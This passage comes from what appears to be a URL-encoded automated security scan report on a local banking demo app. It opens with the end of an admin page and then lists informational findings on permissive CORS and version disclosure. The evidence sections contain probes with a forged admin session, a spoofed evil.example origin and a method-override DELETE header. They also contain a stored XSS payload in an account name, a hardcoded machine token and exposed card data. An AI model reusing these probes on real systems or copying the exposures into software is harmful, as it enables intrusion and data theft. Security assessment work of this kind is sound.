20%20%20%20%20%20%3Cdiv%20id%3D%5C%22fx-rates-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20System%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-system%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ESystem%20Management%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EIntegration%20settings%2C%20database%20operations%20and%20maintenance%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20White-Label%20Partner%20Settings%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20p-6%20sm%3Ap-8%20max-w-xl%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-amber-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-amber-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M13.828%2010.172a4%204%200%2000-5.656%200l-4%204a4%204%200%20105.656%205.656l1.102-1.101m-.758-4.899a4%204%200%20005.656%200l4-4a4%204%200%2000-5.656-5.656l-1.1%201.1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EFACE%20Insurance%20Integration%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EConfigure%20target%20URL%20for%20White-Label%20Insurance%20SSO%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22insurance-settings-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.SystemPage.saveSettings(event)%5C%22%20class%3D%5C%22space-y-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EFACE%20Insurance%20Base%20URL%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22url%5C%22%20id%3D%5C%22setting-insurance-url%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%5C%22%20placeholder%3D%5C%22http%3A%2F%2Flocalhost%3A8001%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%20mt-1.5%5C%22%3EWhen%20customers%20click%20Insurance%2C%20they%20will%20be%20redirected%20to%20this%20URL%20with%20an%20SSO%20assertion%20token.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-3.5%20bg-dark-50%20rounded-xl%20text-xs%20text-dark-600%20space-y-1%20font-mono%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMerchant%20ID%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-id%5C%22%3Efaceinsurance%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3ESettlement%20Account%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-account%5C%22%3E062-001%2088880001%20(face%40example.com)%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMachine%20Auth%20Token%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-machine-token%5C%22%20class%3D%5C%22text-dark-500%5C%22%3Emch_face_insurance_secret_key_2026%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20id%3D%5C%22save-settings-btn%5C%22%20class%3D%5C%22bg-dark-900%20hover%3Abg-dark-800%20text-white%20font-semibold%20px-6%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESave%20Settings%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20Reset%20Database%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-red-200%20p-6%20sm%3Ap-8%20max-w-xl%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-red-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%209v2m0%204h.01m-6.938%204h13.856c1.54%200%202.502-1.667%201.732-3L13.732%204c-.77-1.333-2.694-1.333-3.464%200L3.34%2016c-.77%201.333.192%203%201.732%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EReset%20Database%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EDrop%20and%20recreate%20the%20entire%20database%20with%20seed%20data%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-red-50%20border%20border-red-200%20rounded-xl%20p-4%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-800%20text-sm%20font-medium%5C%22%3EWarning%3A%20This%20action%20is%20irreversible%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-600%20text-xs%20mt-1%5C%22%3EAll%20customer%20data%2C%20accounts%2C%20and%20transactions%20will%20be%20permanently%20deleted%20and%20replaced%20with%20default%20seed%20data.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-600%20mb-3%5C%22%3EType%20%3Cstrong%3ERESET%3C%2Fstrong%3E%20below%20to%20confirm%3A%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22reset-confirm-input%5C%22%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20font-mono%20tracking-widest%20text-center%20text-lg%20mb-4%5C%22%20placeholder%3D%5C%22Type%20RESET%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20id%3D%5C%22reset-btn%5C%22%20onclick%3D%5C%22BankOfEdAdmin.SystemPage.handleReset()%5C%22%20class%3D%5C%22w-full%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%20disabled%3Acursor-not-allowed%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3EReset%20Database%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fmain%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Scripts%20--%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Futils.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapi.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Frouter.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fauth.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fcustomers.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Faccounts.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fsystem.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Ffx-rates.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapp.js%5C%22%3E%3C%2Fscript%3E%5Cn%3C%2Fbody%3E%5Cn%3C%2Fhtml%3E%5Cn%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20API%20returns%20Access-Control-Allow-Origin%3A%20*%20together%20with%20Access-Control-Allow-Credentials%3A%20true%20and%20permits%20all%20request%20headers.%22%2C%22impact%22%3A%22Public%20API%20responses%20may%20be%20readable%20from%20arbitrary%20origins.%20Browsers%20normally%20reject%20credentialed%20wildcard-origin%20responses%2C%20so%20authenticated%20cross-origin%20data%20access%20was%20not%20demonstrated.%22%2C%22likelihood%22%3A%22The%20configuration%20is%20confirmed%2C%20but%20this%20probe%20received%20only%20a%20401%20response%20and%20did%20not%20prove%20access%20to%20sensitive%20data.%22%2C%22recommendation%22%3A%22Allow%20only%20trusted%20origins%2C%20return%20Access-Control-Allow-Credentials%20only%20when%20required%2C%20and%20restrict%20allowed%20methods%20and%20headers%20to%20those%20the%20API%20uses.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%2F10%22%2C%22evidence%22%3A%22The%20401%20API%20response%20included%20Access-Control-Allow-Origin%3A%20*%2C%20Access-Control-Allow-Credentials%3A%20true%2C%20Access-Control-Allow-Headers%3A%20*%2C%20and%20broad%20allowed%20methods.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%2F10%5Cnuse_session%3A%20fresh_forged_admin%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A32%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%2F10%5Cnuse_session%3A%20fresh_forged_admin%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A32%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22API%20responses%20disclose%20the%20exact%20Apache%20and%20PHP%20versions%20through%20the%20Server%20and%20X-Powered-By%20headers.%22%2C%22impact%22%3A%22The%20information%20can%20help%20attackers%20identify%20version-specific%20vulnerabilities%2C%20but%20it%20does%20not%20demonstrate%20direct%20compromise.%22%2C%22likelihood%22%3A%22High%20for%20discovery%20because%20the%20headers%20are%20returned%20to%20anonymous%20requests.%20Direct%20security%20impact%20is%20informational.%22%2C%22recommendation%22%3A%22Suppress%20the%20X-Powered-By%20header%20and%20configure%20Apache%20to%20return%20a%20minimal%20Server%20header.%20Keep%20both%20components%20patched.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22The%20anonymous%20login%20response%20included%20Server%3A%20Apache%2F2.4.68%20(Unix)%20and%20X-Powered-By%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A54%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A54%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22API%20responses%20disclose%20the%20exact%20Apache%20and%20PHP%20versions%20through%20Server%20and%20X-Powered-By%20headers.%22%2C%22impact%22%3A%22The%20information%20can%20help%20an%20attacker%20identify%20version-specific%20weaknesses%2C%20but%20it%20does%20not%20establish%20that%20either%20component%20is%20vulnerable.%22%2C%22likelihood%22%3A%22The%20version%20information%20is%20returned%20to%20remote%20callers%20on%20normal%20API%20responses.%22%2C%22recommendation%22%3A%22Suppress%20detailed%20Server%20and%20X-Powered-By%20headers%20or%20replace%20them%20with%20generic%20values.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%22%2C%22evidence%22%3A%22The%20response%20headers%20disclosed%20Server%3A%20Apache%2F2.4.68%20(Unix)%20and%20X-Powered-By%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%5Cnuse_session%3A%20configured_primary%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22X-HTTP-Method-Override%5C%22%3A%20%5C%22DELETE%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2012%3A59%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%201011%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%5B%7B%5C%22id%5C%22%3A1%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Everyday%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%223450.75%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A2%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Savings%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2218900.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000003%5C%22%2C%5C%22account_type%5C%22%3A%5C%22loan%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Home%20Loan%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%22-285000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A51%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000004%5C%22%2C%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Platinum%20Credit%20Card%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2225000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%2C%5C%22card_number%5C%22%3A%5C%224532015001345674%5C%22%2C%5C%22card_expiry%5C%22%3A%5C%2208%5C%5C%2F29%5C%22%2C%5C%22card_cvv%5C%22%3A%5C%22842%5C%22%2C%5C%22credit_limit%5C%22%3A%5C%2225000.00%5C%22%7D%2C%7B%5C%22id%5C%22%3A101%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210593296%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22')%3Bdocument.body.dataset.aespa%3D'xss007'%3B%5C%5C%2F%5C%5C%2F%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%220.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%5D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%5Cnuse_session%3A%20configured_primary%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22X-HTTP-Method-Override%5C%22%3A%20%5C%22DELETE%5C%22%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2012%3A59%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5C